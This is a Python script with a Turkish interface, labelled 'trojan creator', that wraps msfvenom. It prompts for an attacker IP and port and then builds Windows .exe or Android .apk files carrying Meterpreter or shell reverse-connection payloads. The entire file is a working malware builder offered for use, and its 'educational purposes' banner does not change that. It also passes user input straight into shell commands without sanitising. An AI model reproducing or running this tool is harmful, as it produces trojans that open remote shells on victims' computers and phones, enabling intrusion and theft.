# -*- coding: utf-8 -*-
import os
import importlib.util

packages = ['pystyle', 'python-cfonts', 'requests', 'subprocess', 'colorama', 'beautifulsoup4']

for package in packages:
    if not importlib.util.find_spec(package):
        print(f"Installng required ackage: {package}")
        os.system(f"pip install {package}")
from pystyle import *
import requests
import subprocess
from cfonts import render, say
from colorama import Fore, Back, Style
from bs4 import BeautifulSoup
import time

os.system("clear")

banner = '''

████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██╗██╗  ██╗
╚══██╔══╝██╔══██╗██╔═══██      ██ ██╔══██╗████╗  ██║██║╚██╗██╔╝
   ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██║ ╚███╔╝ 
   ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██║ ██╔██╗ 
   ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║██╔╝ ██╗
   ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
       ╔══════════════════════════════════════════════╗
       ║               trojan creator                 ║
       ║              coded by qwexsa                 ║
       ║              discord:qawexsa                 ║
       ║        For Educational Purposes Only         ║
       ╚══════════════════════════════════════════════╝'''

print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))
print('\033[97m' + "developer " + '\033[93m' + "'" + '\033[97m' + " " + '\033[91m' + ": qwexsa" + '\033[1m')

print('\033[97m' +  "trojan oluşturma kod betiğime hoşgeldin." + '\033[1m')

ip = input('\033[97m' + "[+] Lokal ya da Dış ip giriniz : " + '\033[1m')
port = input('\033[97m' + "[+] Port giriniz : " + '\033[1m')

print('\033[1;33m' + """
1) windows/x64/meterpreter/revers_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https
4) android/meterpreter/reverse_tcp
5) android/meterpreter/reverse_http
6) android/meterpreter/reverse_https
7) android/shell/revers_tcp
""" + '\033[1m')

payload=input('\033[1;97m' + "Oluşturacağın payload türünü seç: " + '\033[0m')
kayityeri=input('\033[1;94m' + "Payload'ı kaydedeceğin yeri yaz: " + '\033[0m')

if payload=="1":
        filename = input('\033[1;97;1m' + "Trojanın Adını Gir (örn : trojan.exe): " + '\033[0m')
        os.system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri + "/" + filename)

elif payload=="2":
        filename = input('\033[1;97;1m' + "Trojanın Adını Gir (örn : trojan.exe): " + '\033[0m')
        os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri + "/" + filename)

elif payload=="3":
        filename = input('\033[1;97;1m' + "Trojanın Adını Gir (örn : trojan.exe): " + '\033[0m')
        os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri + "/" + filename)

elif payload == "4":
        filename = input('\033[1;97;1m' + "Trojanın Adını Gir (örn : trojan.apk): " + '\033[0m')
        os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -o " + kayityeri + "/" + filename)

elif payload == "5":
        filename = input('\033[1;97;1m' + "Trojanın Adını Gir (örn : trojan.apk): " + '\033[0m')
        os.system(f"msfvenom -p android/meterpreter/reverse_http LHOST={ip} LPORT={port} -o {kayityeri}/{filename}")

elif payload == "6":
        filename = input('\033[1;97;1m' + "Trojanın Adını Gir (örn : trojan.apk): " + '\033[0m')
        os.system("msfvenom -p android/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -o " + kayityeri + "/" + filename)

elif payload == "7":
        filename = input('\033[1;97;1m' + "Trojanın Adını Gir (örn : trojan.apk): " + '\033[0m')
        os.system("msfvenom -p android/shell/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -o " + kayityeri + "/" + filename)


# Made by qwexsa
